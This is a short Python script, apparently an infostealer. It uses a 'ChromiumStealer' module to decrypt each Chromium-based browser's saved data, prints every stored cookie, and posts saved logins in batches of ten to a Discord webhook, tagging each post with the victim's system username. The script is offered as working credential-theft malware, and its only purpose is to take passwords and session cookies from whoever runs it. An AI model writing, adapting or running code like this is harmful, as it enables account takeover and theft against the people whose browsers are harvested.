from ChromiumStealer import ChromiumStealer
from ChromiumStealer import Browsers

import requests, getpass

def discord_post(chunk):
    content = '```\n' + '\n\n'.join(['\n'.join([f'{k}: {v}' for k, v in x.items()]) for x in chunk]) + '\n```'
    
    requests.post('https://discord-webhook-url.com', data={'content': content, 'username': f'Chomium Logs | {getpass.getuser()}'})

def main():
    for browser in Browsers:

        stealer = ChromiumStealer(browser)
        if not stealer.exists():
            print(f'{browser.name} Does not exist.')
        else:
            stealer.initialize_crypter()

            for cookie in stealer.cookies():
                print(cookie['host'], cookie['name'], cookie['value'])

            chunk = []
            for i, login in enumerate(stealer.logins()):
                if i % 10 == 0: # Post max 10 logins at a time to a discord webhook
                    discord_post(chunk)
                    chunk.clear()
                chunk.append(login)

            if len(chunk) > 0: # Post the remaining logins
                discord_post(chunk)

if __name__ == '__main__':
    main()